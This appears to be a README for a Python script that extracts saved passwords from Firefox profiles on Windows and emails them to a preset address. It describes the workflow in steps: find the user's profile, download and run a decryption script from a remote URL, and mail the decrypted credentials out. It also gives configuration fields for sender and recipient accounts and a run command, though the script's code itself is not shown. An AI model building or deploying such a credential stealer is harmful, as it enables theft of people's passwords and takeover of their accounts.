# Firefox Password Decryptor Script

This script is designed to extract passwords stored in Firefox profiles on a Windows system and send an email with the decrypted passwords. Below is a guide on how to use this script.

## Requirements

- Python 3.x
- The following Python libraries must be installed:
  - `requests`
  - `smtplib`
  - `email`

  You can install the `requests` library using pip:
  
  ````bash
  pip install requests
  ````
- An SMTP server compatible with SSL for sending emails (e.g., Gmail).

## Script Description

The script performs the following actions:

1. **Obtain Username and Firefox Profile:**
   - Determines the current username.
   - Locates the Firefox profile associated with the user.

2. **Download and Execute Decryption Script:**
   - Downloads a Firefox decryption script from a specified URL.
   - Executes the decryption script on the user's Firefox profile.

3. **Send Email:**
   - Sends an email with the decrypted passwords to a specified address.

## Usage

### Configuration

Before running the script, make sure to update the following variables in the code:

- **Sender Email:** example123@gmail.com
- **Sender Password:** "admin123" (replace with the actual sender's password)
- **Recipient Email Address:** example321@gmail.com

### Execution

To run the script, simply execute the following command in your terminal:

```bash
python <script_name>.py
